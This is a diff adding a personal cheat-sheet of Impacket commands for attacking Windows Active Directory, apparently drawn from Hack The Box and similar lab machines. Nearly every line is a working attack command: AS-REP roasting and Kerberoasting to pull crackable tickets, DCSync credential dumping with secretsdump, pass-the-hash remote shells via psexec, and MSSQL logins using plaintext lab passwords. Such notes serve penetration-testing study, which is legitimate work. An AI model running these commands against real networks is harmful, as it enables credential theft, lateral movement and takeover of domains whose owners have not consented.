@@ -1,0 +1,40 @@
+locate impacket | grep example
+cd /usr/share/doc/python3-impacket/examples/
+
+
+
+//getNPUsers -> Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking
+python3 GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/' -format hashcat
+python3 GetNPUsers.py -dc-ip 10.10.10.175 -request 'EGOTISTICAL-BANK.LOCAL/username' -format hashcat
+python3 GetNPUsers.py -dc-ip 10.10.10.175 -request 'EGOTISTICAL-BANK.LOCAL/' -no-pass -usersfile /home/daerves/Scrivania/git/SecNotes/htb/active_directory_101/2_sauna/generated_usernames.txt -format hashcat
+
+//GET TGTs for users (simile  aquello di sopra (?))
+python3 GetUserSPNs.py -dc-ip 10.10.10.100 -request  active.htb/svc_tgs
+
+
+
+//GetADUsers.py --> GET active directory users:
+GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/svc_tgs
+
+
+
+
+
+//GetUSerPasswordHashes
+sudo python3 secretsdump.py htb.local/daerves:password123@10.10.10.161              //con DCSync
+
+//CHECK RPC PORTS
+python3 rpcdump.py -p 135 10.11.1.5
+
+//REMOTE SHELL VIA HASHES OR PWD:
+//access via pass the hash:
+sudo python3 psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
+
+sudo python3 psexec.py administrator:Ticketmaster1968@10.10.10.100
+
+
+//LOGIN MSSQL (1433)
+
+mssqlclient.py  -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> #Recommended -windows-auth when you are going to use a domain. use as domain the netBIOS name of the machine
+
+python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -db master RALPH/sa:poiuytrewq@10.11.1.31
